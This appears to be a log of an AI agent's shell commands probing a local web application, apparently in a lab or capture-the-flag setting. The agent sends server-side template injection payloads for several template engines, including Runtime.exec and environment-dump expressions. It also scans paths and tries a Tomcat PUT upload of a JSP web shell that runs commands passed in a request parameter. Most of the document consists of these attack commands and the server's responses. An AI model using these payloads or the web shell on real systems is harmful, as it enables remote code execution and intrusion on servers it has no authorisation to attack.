input.command:
curl -s "http://host.docker.internal:8080/?name=test&age=10" 2>&1
echo "---"
curl -s "http://host.docker.internal:8080/?name=__\${7*7}__&age=10" 2>&1
echo "---"
curl -s "http://host.docker.internal:8080/?name=%2A%7B7*7%7D&age=10" 2>&1

result:
[exit=0]

Hello, my name is test, I am 10 years old.

---

Hello, my name is __$7*7__, I am 10 years old.

---

Hello, my name is *{7*7}, I am 10 years old.

input.command:
# Thymeleaf SSTI - name에 다양한 표현식 시도
curl -s "http://host.docker.internal:8080/?name=__\$%7B7*7%7D__&age=10" 2>&1
echo "---"
# Freemarker
curl -s 'http://host.docker.internal:8080/?name=${7*7}&age=10' 2>&1
echo "---"
# JSP EL
curl -s 'http://host.docker.internal:8080/?name=${"test"}&age=10' 2>&1

result:
[exit=0]

Hello, my name is __${7*7}__, I am 10 years old.

---

Hello, my name is $7*7, I am 10 years old.

input.command:
# age 파라미터에 숫자가 아닌 값 시도 - integer validation 확인
curl -s "http://host.docker.internal:8080/?name=test&age=abc" 2>&1
echo "---"
# age에 SSTI
curl -s 'http://host.docker.internal:8080/?name=test&age=%24%7B7*7%7D' 2>&1
echo "---"
# Spring Expression Language (SpEL)
curl -s 'http://host.docker.internal:8080/?name=test&age=#{7*7}' 2>&1

result:
[exit=0] HTTP Status 400 – Bad Request

HTTP Status 400 – Bad Request

Type Status Report

Description The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or deceptive request routing).

Apache Tomcat/8.5.77

input.command:
# 웹 경로 스캔
for path in /index.jsp /index.html /app /api /flag /secret /cmd /exec /upload /file /page /home /user /view /template /render /process /submit /form; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://host.docker.internal:8080$path")
  echo "$code $path"
done

input.command:
# age 파라미터에 숫자가 아닐 때 400 에러 - 유효성 검증이 있음
# Thymeleaf 취약점 탐색 - Spring MVC + Thymeleaf 조합
# CVE-2023-38286, CVE-2022-22978 등 검토

# Thymeleaf fragment injection: __${expr}__
curl -s 'http://host.docker.internal:8080/?name=__${T(java.lang.Runtime).getRuntime().exec("id")}__&age=25' 2>&1
echo "---"
# Spring expression
curl -s --data-urlencode 'name=__${T(java.lang.Runtime).getRuntime().exec("id")}__' -d 'age=25' 'http://host.docker.internal:8080/' 2>&1

result:
[exit=0] HTTP Status 400 – Bad Request

HTTP Status 400 – Bad Request

Type Exception Report

Message Invalid character found in the request target [/?name=__$T(java.lang.Runtime).getRuntime().exec("id")__&age=25 ]. The valid characters are defined in RFC 7230 and RFC 3986

Description The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or deceptive request routing).

Exception

java.lang.IllegalArgumentException: Invalid character

input.command:
# Thymeleaf SSTI 검증 - Fragment expression
curl -g -s "http://host.docker.internal:8080/?name=__\${new+java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__&age=25" 2>&1
echo "---"
# POST 방식도 시도
curl -s -X POST -d 'name=__${7*7}__&age=25' "http://host.docker.internal:8080/" 2>&1

result:
[exit=0] HTTP Status 400 – Bad Request

input.command:
# URL 인코딩을 완전히 사용해서 SSTI 시도
# __${7*7}__ → %5F%5F%24%7B7%2A7%7D%5F%5F
curl -s "http://host.docker.internal:8080/?name=%5F%5F%24%7B7%2A7%7D%5F%5F&age=25" 2>&1
echo "---"
# Thymeleaf expression: __${T(java.lang.System).getenv()}__
curl -s "http://host.docker.internal:8080/?name=%5F%5F%24%7BT%28java.lang.System%29.getenv%28%29%7D%5F%5F&age=25" 2>&1

result:
[exit=0]

Hello, my name is __${7*7}__, I am 25 years old.

---

Hello, my name is __${T(java.lang.System).getenv()}__, I am 25 years old.

done

# SSTI 테스트 - 다양한 템플릿 엔진
echo "=== Thymeleaf test ==="
curl -s "http://host.docker.internal:8080/?name=\${7*7}&age=20"
echo ""
echo "=== SpEL test ==="
curl -s "http://host.docker.internal:8080/?name=#{7*7}&age=20"
echo ""
echo "=== FreeMarker test ==="
curl -s "http://host.docker.internal:8080/?name=\${7*7}&age=20"
echo ""
echo "=== Velocity test ==="
curl -s "http://host.docker.internal:8080/?name=#set(\$x=7*7)\$x&age=20"

echo "=== Thymeleaf __${...}__ test ==="
curl -s "http://host.docker.internal:8080/?name=__\${7*7}__&age=20"
echo ""
echo "=== Thymeleaf expression ==="
curl -s "http://host.docker.internal:8080/?name=__\${T(java.lang.Runtime).getRuntime().exec('id')}__&age=20"
echo ""
echo "=== Spring view name injection ==="
curl -s "http://host.docker.internal:8080/?name=a&age=__\${7*7}__"
echo ""
# age 파라미터에도 시도
echo "=== age SSTI ==="
curl -s "http://host.docker.internal:8080/?name=test&age=\${7*7}"

input.command:
# SpEL #{...} 결과가 비어 있는 것 확인 - 더 다양한 표현식 시도
echo "=== SpEL #{7*7} ==="
curl -s "http://host.docker.internal:8080/?name=%23%7B7*7%7D&age=20"
echo ""
echo "=== SpEL #{7*7} direct ==="
curl -v "http://host.docker.internal:8080/?name=%23%7B7*7%7D&age=20" 2>&1
echo ""

# 이전 결과 재확인 - SpEL 결과가 빈 응답이었던 것 확인
# 이전에는 #{7*7} -> 빈 응답이었음. 이번엔 리터럴로 출력됨
# 다시 정확히 확인

# POST 요청도 시도
echo "=== POST request ==="
curl -s -X POST "http://host.docker.internal:8080/" -d "name=test&age=20"
echo ""
echo "=== POST with SSTI ==="
curl -s -X POST "http://host.docker.internal:8080/" -d "name=%23%7B7*7%7D&age=20"
echo ""

# 다른 경로 탐색

curl -s "http://host.docker.internal:8080/greet?name=test&age=20"
echo ""
echo "=== /hello ==="
curl -s "http://host.docker.internal:8080/hello?name=test&age=20"
echo ""
echo "=== /welcome ==="
curl -s "http://host.docker.internal:8080/welcome?name=test&age=20"

input.command:
# Tomcat 8.5.77 - Apache Tomcat 취약점 확인
# CVE-2017-12617: JSP 파일 업로드 (PUT)
# CVE-2019-0232: CGI 취약점
# CVE-2020-1938: GhostCat (AJP)
# CVE-2022-42252 등

# 먼저 PUT 방식으로 JSP 파일 업로드 시도 (CVE-2017-12617)
echo "=== PUT JSP upload attempt ==="
curl -s -X PUT "http://host.docker.internal:8080/shell.jsp/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '<%@ page import="java.util.*,java.io.*"%><%String cmd=request.getParameter("cmd");if(cmd!=null){Process p=Runtime.getRuntime().exec(cmd);InputStream in=p.getInputStream();int a=0;byte[] b=new byte[1024];while((a=in.read(b))!=-1){out.print(new String(b,0,a));}p.destroy();}%>'
echo ""
echo "Exit: $?"

# 그런 다음 shell.jsp 접근 시도
echo "=== Accessing uploaded shell ==="
curl -s "http://host.docker.internal:8080/shell.jsp?cmd=id"

result:
[exit=0] === PUT JSP upload attempt === HTTP Status 404 – Not Found

Type Status Report

Description The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.

Apache Tomcat/8.5.77

Exit: 0 === Accessing uploaded shell === HTTP Status 404 – Not Found

input.command:
# 이전 실행에서 SpEL #{7*7} 결과가 ""(빈) 였다고 했는데, 다시 확인
# 이전 메모리: "Hello, my name is , I am  years old."
# 이는 age도 비어있었음 - #{7*7}이 name AND age 파라미터를 다 처리했나?

# 이전 curl 명령 재현
echo "=== Exact reproduction of previous SpEL test ==="
curl -s "http://host.docker.internal:8080/?name=#{7*7}&age=20"
echo ""

# URL 인코딩하지 않고 그대로 전송
echo "=== Raw # curl ==="
curl -s --data-urlencode "name=#{7*7}" --data-urlencode "age=20" -G "http://host.docker.internal:8080/"
echo ""

# Spring Framework의 SpEL - @Value 같은 것에서 #{...} 사용
# 아니면 Freemarker나 Pebble 등의 다른 템플릿 엔진
echo "=== Pebble template ==="
curl -s "http://host.docker.internal:8080/?name={{7*7}}&age=20" 
echo ""

# 만약 #{7*7}에서 빈 결과가 나왔다면, 어딘가에서 처리 중인 것
# 이전 이력에서 age도 빈 문자열이었음 -> name=#{7*7}&age=20 에서 age가 없어짐
# 이는 # 이후를 fragment로 처리 -> URL fragment!

echo "=== Testing without URL encoding ==="
python3 -c "
import urllib.request
import urllib.parse
url = 'http://host.docker.internal:8080/?name=%23%7B7*7%7D&age=20'
req = urllib.request.urlopen(url)
print(req.read().decode())
"

result:
[exit=0] === Exact reproduction of previous SpEL test ===

Hello, my name is , I am years old.

=== Raw # curl ===

Hello, my name is #{7*7}, I am 20 years old.

=== Pebble template === === Testing without URL encoding ===

Hello, my name is #{7*7}, I am 20 years old.
